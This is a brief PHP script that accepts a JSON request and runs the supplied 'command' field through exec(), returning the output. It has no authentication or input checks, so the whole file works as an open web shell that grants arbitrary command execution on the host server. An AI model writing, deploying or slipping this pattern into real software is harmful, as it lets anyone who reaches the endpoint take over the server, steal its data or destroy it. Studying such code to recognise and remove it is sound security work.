<?php
header('Content-Type: application/json');

// Get JSON data from the request
$data = json_decode(file_get_contents('php://input'), true);

if ($data && isset($data['command'], $data['message'])) {
    $command = $data['command'];
    $message = $data['message'];

    // Run the command and capture the output
    exec($command, $output);

    // Send the output back as JSON
    echo json_encode(['output' => implode("<br>", $output)]);
} else {
    // If data is not provided or is invalid, return an error
    echo json_encode(['error' => 'Invalid data']);
}
?>
